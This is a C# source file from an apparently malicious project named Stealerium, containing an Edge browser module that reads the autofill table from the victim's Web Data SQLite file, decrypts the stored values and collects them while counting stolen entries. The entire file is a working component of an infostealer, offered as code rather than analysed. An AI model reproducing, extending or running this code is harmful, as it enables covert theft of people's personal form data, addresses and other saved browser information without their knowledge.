using System;
using System.Collections.Generic;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Edge
{
    internal sealed class Autofill
    {
        /// <summary>
        ///     Get Autofill values from edge browser
        /// </summary>
        /// <param name="sWebData"></param>
        /// <returns>List with autofill</returns>
        public static List<AutoFill> Get(string sWebData)
        {
            var acAutoFillData = new List<AutoFill>();
            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sWebData, "autofill");
                if (sSqLite == null) return acAutoFillData;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var aFill = new AutoFill
                    {
                        Name = Crypto.GetUtf8(sSqLite.GetValue(i, 1)),
                        Value = Crypto.GetUtf8(Crypto.EasyDecrypt(sWebData, sSqLite.GetValue(i, 2)))
                    };

                    Counter.AutoFill++;
                    acAutoFillData.Add(aFill);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Edge >> Failed collect autofill\n" + ex);
            }

            return acAutoFillData;
        }
    }
}